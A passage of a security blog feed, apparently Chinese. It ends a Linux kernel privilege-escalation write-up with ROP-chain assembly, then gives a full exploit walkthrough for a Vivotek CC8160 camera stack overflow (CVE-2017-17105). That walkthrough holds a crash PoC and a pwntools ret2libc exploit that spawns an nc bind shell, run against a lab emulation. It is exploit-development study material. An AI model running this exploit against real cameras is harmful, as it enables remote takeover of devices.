pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/5e048596e128fae2bdbdc56eb630a8c4_MD5.jpeg"></p><h2 id="ä¸‰-ä¸­é—´å‡ºç°çš„é—®é¢˜"><a href="#ä¸‰-ä¸­é—´å‡ºç°çš„é—®é¢˜" class="headerlink" title="(ä¸‰) ä¸­é—´å‡ºç°çš„é—®é¢˜"></a>(ä¸‰) ä¸­é—´å‡ºç°çš„é—®é¢˜</h2><p>æˆ‘ä¸€å¼€å§‹æ˜¯è¿™æ ·è§¦å‘ropchainçš„ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">   <span class="token function">__asm__</span><span class="token punctuation">(</span>       <span class="token string">"mov r15, POP_RDI_RET;"</span>       <span class="token string">"mov r14, 0;"</span>       <span class="token string">"mov r13, prepare_kernel_cred;"</span>       <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>       <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>       <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>       <span class="token string">"mov r9,  commit_creds;"</span>       <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœä¸€ç›´æ®µé”™è¯¯ğŸ¤¡ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬å·²ç»ä¿®æ”¹äº†rbpä¸ºä¸€ä¸ªéæ³•å€¼ï¼Œåé¢å†è°ƒç”¨å‡½æ•°è‚¯å®šä¼šä½¿ç”¨rbpä»è€Œå‡ºç°å¼‚å¸¸</p><p>æ­£ç¡®çš„åšæ³•æ˜¯è¿›è¡Œç³»ç»Ÿè°ƒç”¨è§¦å‘ropchainï¼Œé¿å…ä½¿ç”¨rbpï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">__asm__</span><span class="token punctuation">(</span>      <span class="token string">"mov r15, POP_RDI_RET;"</span>      <span class="token string">"mov r14, 0;"</span>      <span class="token string">"mov r13, prepare_kernel_cred;"</span>      <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>      <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>      <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>      <span class="token string">"mov r9,  commit_creds;"</span>      <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>      <span class="token string">"xor rax, rax;"</span>      <span class="token string">"mov rdx, 0x8;"</span>      <span class="token string">"mov rsi, rsp;"</span>      <span class="token string">"mov rdi, tmp_fd;"</span>      <span class="token string">"syscall;"</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™ç¯‡çš„å‘æˆ‘è¿˜çœŸé‡åˆ°ä¸å°‘â€¦å“­ï¼Œè€—äº†å¥½é•¿æ—¶é—´ï¼Œè¿˜æ˜¯å¤ªèœäº†</p></blockquote><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK03/distfiles/LK03.tar.gz">LK03.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0302/">Linux Kernel PWN | 040302 Pawnyableä¹‹åŒå– (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK03/double_fetch.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">åŒå– | å¯å…¸å½“ï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vivotek CC8160 æ‘„åƒå¤´æ ˆæº¢å‡ºæ¼æ´ (CVE-2017-17105)</title>
      <link href="/2024/02/12/Vivotek%20CC8160%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20(CVE-2017-17105)/"/>
      <url>/2024/02/12/Vivotek%20CC8160%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20(CVE-2017-17105)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Vivotekæ˜¯ä¸€å®¶çŸ¥åçš„å®¶åº­æ‘„åƒå¤´ä¼ä¸šï¼Œå…¶æ——ä¸‹çš„ä¸€æ¬¾é«˜æ¸…æ‘„åƒå¤´Vivotek CC8160ï¼Œåœ¨2017å¹´è¢«å‘ç°å­˜åœ¨ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚è¿™ä¸ªæ¼æ´æ˜¯ç”±äºç¨‹åºåœ¨å¤„ç†POSTè¯·æ±‚ä¸­çš„Content-Lengthå­—æ®µæ—¶ï¼Œæ²¡æœ‰å¯¹é•¿åº¦è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è¾“å…¥ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²é€ æˆæ ˆæº¢å‡ºã€‚<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17105">CVE - CVE-2017-17105 (mitre.org)</a></p></blockquote><h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><blockquote><p><a href="https://github.com/Vu1nT0tal/IoT-vulhub/tree/master/VIVOTEK/remote_stack_overflow">IoT-vulhub&#x2F;VIVOTEK&#x2F;remote_stack_overflow at master Â· Vu1nT0tal&#x2F;IoT-vulhub (github.com)</a></p></blockquote><h2 id="IoT-vulhubåŸºç¡€ç¯å¢ƒ"><a href="#IoT-vulhubåŸºç¡€ç¯å¢ƒ" class="headerlink" title="IoT-vulhubåŸºç¡€ç¯å¢ƒ"></a>IoT-vulhubåŸºç¡€ç¯å¢ƒ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸‹è½½æœ¬é¡¹ç›®</span><span class="token function">wget</span> https://github.com/VulnTotal-Team/IoT-vulhub/archive/master.zip <span class="token parameter variable">-O</span> iot-vulhub-master.zip<span class="token function">unzip</span> iot-vulhub-master.zip <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> iot-vulhub-master<span class="token comment"># æ„å»º ubuntu1604 åŸºç¡€é•œåƒ</span><span class="token builtin class-name">cd</span> baseImage/ubuntu1604 <span class="token operator">&amp;&amp;</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/ubuntu1604 <span class="token builtin class-name">.</span><span class="token comment"># æ„å»º binwalk å®¹å™¨ï¼Œæ–¹ä¾¿ä½¿ç”¨</span><span class="token builtin class-name">cd</span> baseImage/binwalk <span class="token operator">&amp;&amp;</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/binwalk <span class="token builtin class-name">.</span><span class="token comment"># æ­å»ºqemu userçš„ç¯å¢ƒ</span><span class="token builtin class-name">cd</span> baseImage/qemu-user-static<span class="token function">sudo</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/qemu-user-static <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> VIVOTEK/remote_stack_overflow<span class="token comment"># è§£å‹å›ºä»¶</span>binwalk <span class="token parameter variable">-Mer</span> <span class="token string">"./firmware/CC8160-VVTK-0100d.flash.pkg"</span><span class="token comment"># æ­å»ºqemu systemçš„armç¯å¢ƒ</span><span class="token builtin class-name">cd</span> baseImage/qemu-system/armel/images <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> ./download.sh<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/qemu-system:armel <span class="token builtin class-name">.</span><span class="token function">bash</span> ./init_env.sh arm <span class="token comment">#(æœ‰ä¸‰ç§å‚æ•°: arm/mips/mipsel)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æŠ¥é”™1ï¼šåœ¨æ‰§è¡Œ<code>system-emu/dockerfile</code>å’Œ<code>user-emu/dockerfile</code>æ—¶ä¼šæŠ¥é”™ï¼š<code>COPY ./firmware/_*/_31* /root/firmware</code> ä¼šæ‰§è¡Œå¤±è´¥ã€‚<br>å°†å…¶æ”¹ä¸º <code>COPY ./firmware/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted /root/firmware</code>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ–°ç‰ˆdockerä¸­ï¼Œä¼šå¯¹æ–‡ä»¶ååšæ£€æµ‹</li></ul><h3 id="ç”¨æˆ·æ¨¡æ‹Ÿ"><a href="#ç”¨æˆ·æ¨¡æ‹Ÿ" class="headerlink" title="ç”¨æˆ·æ¨¡æ‹Ÿ"></a>ç”¨æˆ·æ¨¡æ‹Ÿ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ„å»ºé•œåƒ</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml build<span class="token comment"># å¯åŠ¨å®¹å™¨</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml up<span class="token comment"># å…³é—­å®¹å™¨</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç³»ç»Ÿæ¨¡æ‹Ÿ"><a href="#ç³»ç»Ÿæ¨¡æ‹Ÿ" class="headerlink" title="ç³»ç»Ÿæ¨¡æ‹Ÿ"></a>ç³»ç»Ÿæ¨¡æ‹Ÿ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ„å»ºé•œåƒ</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml build<span class="token comment"># å¯åŠ¨å®¹å™¨</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml up<span class="token comment"># å…³é—­å®¹å™¨</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿›å…¥ç”¨æˆ·æœº"><a href="#è¿›å…¥ç”¨æˆ·æœº" class="headerlink" title="è¿›å…¥ç”¨æˆ·æœº"></a>è¿›å…¥ç”¨æˆ·æœº</h3><p>æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># è¿›å…¥æ”»å‡»æœºç¯å¢ƒ</span><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> vivotek-system /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="è¿›å…¥æœåŠ¡å™¨"><a href="#è¿›å…¥æœåŠ¡å™¨" class="headerlink" title="è¿›å…¥æœåŠ¡å™¨"></a>è¿›å…¥æœåŠ¡å™¨</h3><p>æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> vivotek-system /bin/bash<span class="token comment"># è¿›å…¥é¶æœºç¯å¢ƒï¼Œå¯†ç root</span><span class="token function">ssh</span> root@192.168.2.2<span class="token comment">#ä»¥æŒ‡å®šç›®å½•ä¸ºæ ¹å¼¹å‡ºä¸€ä¸ªshell</span><span class="token function">chroot</span> ./squashfs-root/ <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡åœ°å€ï¼š192.168.2.2:80</p><h1 id="äºŒã€æ¼æ´åˆ†æ"><a href="#äºŒã€æ¼æ´åˆ†æ" class="headerlink" title="äºŒã€æ¼æ´åˆ†æ"></a>äºŒã€æ¼æ´åˆ†æ</h1><h2 id="è§£å‹å›ºä»¶"><a href="#è§£å‹å›ºä»¶" class="headerlink" title="è§£å‹å›ºä»¶"></a>è§£å‹å›ºä»¶</h2><ol><li>è§£å‹å›ºä»¶(_CC8160-VVTK-0100d.flash.pkg.extracted)</li><li>è¿›å…¥æ–‡ä»¶å¤¹ï¼Œè§£å‹æ–‡ä»¶ç³»ç»Ÿ(rootfs.img)ï¼Œæ¼æ´ç¨‹åºä½ç½®ä¸º<code>/usr/sbin/httpd</code>ã€‚ARM32æ¶æ„ï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå¼€äº†NXï¼Œä¸”å»é™¤äº†ç¬¦å·è¡¨â€¦</li></ol><h2 id="ä¸€ç‚¹è°ƒè¯•é—®é¢˜"><a href="#ä¸€ç‚¹è°ƒè¯•é—®é¢˜" class="headerlink" title="ä¸€ç‚¹è°ƒè¯•é—®é¢˜"></a>ä¸€ç‚¹è°ƒè¯•é—®é¢˜</h2><p>ä¸è¿‡åœ¨è¿™ä¹‹å‰ï¼Œå…ˆè¦è§£å†³è°ƒè¯•çš„é—®é¢˜â€”-ç”¨æˆ·æœºgdbçš„gefç”¨ä¸äº†ï¼Œè°ƒè¯•å¾ˆä¸æ–¹ä¾¿ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨<code>docker cp</code>æŠŠpwndbgçš„debåŒ…å¤åˆ¶åˆ°é•œåƒé‡Œå®‰è£…ï¼Œå†æŠŠç›®å½•ä¸‹çš„.gdbinitåˆ æ‰ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token punctuation">[</span>https://github.com/pwndbg/pwndbg/releases/download/2023.07.17-pkgs/pwndbg_2023.07.17_amd64.deb<span class="token punctuation">]</span><span class="token punctuation">(</span>https://github.com/pwndbg/pwndbg/releases/download/2023.07.17-pkgs/pwndbg_2023.07.17_amd64.deb<span class="token punctuation">)</span><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> pwndbg_2023.07.17_amd64.deb dockerid:/root/<span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> pwndbg_2023.07.17_amd64.deb <span class="token comment">#å®‰è£…</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/3901a6e6e671cd631f289154208646c0_MD5.jpeg"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>åŸä½œè€…æä¾›äº†POCï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"POST /cgi-bin/admin/upgrade.cgi<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>HTTP/1.0<span class="token entity" title="\n">\n</span>Content-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.2.2 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡å¯¹Content-Lengthçš„äº¤å‰å¼•ç”¨æ‰¾åˆ°æ¼æ´ç‚¹ï¼š<br><img src="/EXP_FILE/c0d50f7242811268f5c0654e3673d52f_MD5.jpeg"><br>æ¥è¯•ä¸‹POCï¼Œè¿œç¨‹è°ƒè¯•è¿›ç¨‹<br><img src="/EXP_FILE/e75d1d37c5e7e83c0b45bfecd136e7be_MD5.jpeg"><br>å¯è§$pcå¯„å­˜å™¨è¢«è¦†ç›–ä¸ºéæ³•åœ°å€ï¼ŒæœåŠ¡å´©æºƒï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><h1 id="ä¸‰ã€EXP"><a href="#ä¸‰ã€EXP" class="headerlink" title="ä¸‰ã€EXP"></a>ä¸‰ã€EXP</h1><p>å¼€äº†NXï¼Œret2libcæˆ–è®¸æ˜¯ä¸ªå¯ç”¨çš„é€‰æ‹©ï¼Œä½†å‰ææ˜¯vivotekå®ä½“æœºä¸Šæ²¡æœ‰å¼€aslrï¼Œå¦åˆ™çš„è¯è¿˜æ˜¯è¦å…ˆæ³„éœ²libcåŸºå€ã€‚è€ƒè™‘åˆ°IoTè®¾å¤‡ä¸ºæ•ˆç‡è€ƒè™‘ä¸€èˆ¬æ˜¯ä¸ä¼šå¼€aslrçš„ï¼Œæ‰€ä»¥è¿™è¾¹ç›´æ¥é€šè¿‡ret2libcæ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>å…ˆåœ¨qemuçš„arm-debianè™šæ‹Ÿæœºä¸­å…³é—­aslrï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡æµ‹è¯•ï¼Œæº¢å‡ºé•¿åº¦ä¸º0x38æ­£å¥½èƒ½è¦†ç›–åˆ°$pc<br><img src="/EXP_FILE/2d2c991180390fb3c52cbf5c44fad401_MD5.jpeg"></p><p>è·å¾—libcåŸºå€å’Œç¨‹åºå´©æºƒæ—¶$spçš„å€¼ï¼š<br><img src="/EXP_FILE/1c9f71e62672340fe79bedb27cf13755_MD5.jpeg"><br><img src="/EXP_FILE/2d2c991180390fb3c52cbf5c44fad401_MD5.jpeg"></p><blockquote><p>åˆ©ç”¨æ—¶æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œæº¢å‡ºæ˜¯é€šè¿‡<code>strncpy</code>å‡½æ•°å®ç°çš„ï¼Œè¦é¿å…00æˆªæ–­ã€‚å› æ­¤æˆ‘é€‰æ‹©ä½¿ç”¨libcä¸­çš„gadgetã€‚</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token number">0xb6f2d000</span>stack<span class="token operator">=</span><span class="token number">0xbeffeb00</span>r1_pc<span class="token operator">=</span><span class="token number">0x00048784</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressmov_r0_r1_pp_pc<span class="token operator">=</span><span class="token number">0x00016aa4</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressshell<span class="token operator">=</span>stack<span class="token operator">+</span><span class="token number">0x14</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>r1_pc<span class="token punctuation">,</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>mov_r0_r1_pp_pc<span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">,</span><span class="token string">b'bbbb'</span><span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">b'nc -l -p 4444 -e /bin/sh; '</span>head<span class="token operator">=</span><span class="token string">b'POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:'</span>end<span class="token operator">=</span><span class="token string">b'\n\r\n\r\n'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>head<span class="token operator">+</span>payload<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token comment">#itr()</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>binary<span class="token operator">=</span><span class="token string">'./httpd'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libuClibc-0.9.33.3-git.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'192.168.2.2'</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 